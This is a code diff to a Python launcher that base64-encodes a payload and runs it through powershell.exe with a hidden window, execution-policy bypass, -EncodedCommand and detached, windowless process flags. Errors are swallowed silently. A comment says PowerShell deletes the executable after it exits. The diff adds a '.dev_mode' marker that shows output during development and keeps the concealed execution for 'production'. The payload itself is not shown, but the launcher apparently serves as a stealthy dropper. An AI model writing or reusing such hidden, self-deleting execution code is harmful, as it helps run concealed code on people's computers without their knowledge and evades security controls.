@@ -37,35 +37,59 @@ def main():
         # Base64 encode
         payload_base64 = base64.b64encode(payload_bytes).decode("ascii")
 
-        # Execute PowerShell with hidden window (non-blocking)
-        # Use Popen instead of run() so the .exe can exit immediately
-        # This allows PowerShell to delete the .exe after it exits
-        creation_flags = 0
-        if sys.platform == "win32":
-            # Windows-specific flags for detached, hidden process
-            DETACHED_PROCESS = 0x00000008
-            CREATE_NO_WINDOW = 0x08000000
-            creation_flags = DETACHED_PROCESS | CREATE_NO_WINDOW
+        # Check if we're in dev mode (dev_mode marker exists in dist folder)
+        dev_mode = False
+        try:
+            # Check if .dev_mode marker exists next to the .exe
+            exe_dir = os.path.dirname(os.path.abspath(sys.executable))
+            dev_marker = os.path.join(exe_dir, ".dev_mode")
+            dev_mode = os.path.exists(dev_marker)
+        except:
+            pass
 
-        subprocess.Popen(
+        # Build PowerShell command
+        ps_args = ["powershell.exe"]
+
+        if not dev_mode:
+            # Production: Hidden window
+            ps_args.extend(["-WindowStyle", "Hidden"])
+
+        ps_args.extend(
             [
-                "powershell.exe",
-                "-WindowStyle",
-                "Hidden",
                 "-NoProfile",
                 "-ExecutionPolicy",
                 "Bypass",
                 "-NonInteractive",
                 "-EncodedCommand",
                 payload_base64,
-            ],
+            ]
+        )
+
+        # Set creation flags based on mode
+        creation_flags = 0
+        stdout_dest = subprocess.DEVNULL
+        stderr_dest = subprocess.DEVNULL
+
+        if sys.platform == "win32" and not dev_mode:
+            # Production: Detached, hidden process
+            DETACHED_PROCESS = 0x00000008
+            CREATE_NO_WINDOW = 0x08000000
+            creation_flags = DETACHED_PROCESS | CREATE_NO_WINDOW
+        elif dev_mode:
+            # Dev mode: Show output
+            stdout_dest = None
+            stderr_dest = None
+
+        subprocess.Popen(
+            ps_args,
             shell=False,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
+            stdout=stdout_dest,
+            stderr=stderr_dest,
             creationflags=creation_flags,
         )
-    except Exception:
-        # Silent failure
+    except Exception as e:
+        if dev_mode:
+            print(f"ERROR: {e}")
         pass
 
     # Exit immediately without waiting for PowerShell
